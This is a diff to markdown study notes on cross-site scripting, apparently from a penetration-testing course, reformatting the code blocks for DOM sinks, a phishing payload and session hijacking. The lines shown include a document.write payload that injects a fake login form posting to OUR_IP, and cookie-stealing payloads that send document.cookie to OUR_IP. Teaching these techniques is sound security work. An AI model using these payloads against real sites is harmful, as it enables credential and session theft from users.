@@ -32,9 +32,9 @@ The third and final type of XSS is another Non-Persistent type called DOM-based 
 To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field.
 
 On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:
-```document.write();```
-```DOM.innerHTML;```
-```DOM.outerHTML.```
+- document.write();
+- DOM.innerHTML;
+- DOM.outerHTML.
 
 Furthermore, some of the jQuery library functions that write to DOM objects are:
 - add();
@@ -77,7 +77,9 @@ Another very common type of XSS attack is a phishing attack. Phishing attacks us
 
 Example of JS malicious code:
 
-```document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');```
+```
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
 
 We need to set a listener to steal credentials (example in php code):
 
@@ -147,9 +149,11 @@ If we get a request for /username, then we know that the username field is vulne
 Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.
 It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.
 There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by PayloadsAllTheThings:
-```document.location='http://OUR_IP/index.php?c='+document.cookie;```
-```new Image().src='http://OUR_IP/index.php?c='+document.cookie;```
+```
+document.location='http://OUR_IP/index.php?c='+document.cookie;
 
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
 
 We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well:
 ```new Image().src='http://OUR_IP/index.php?c='+document.cookie```
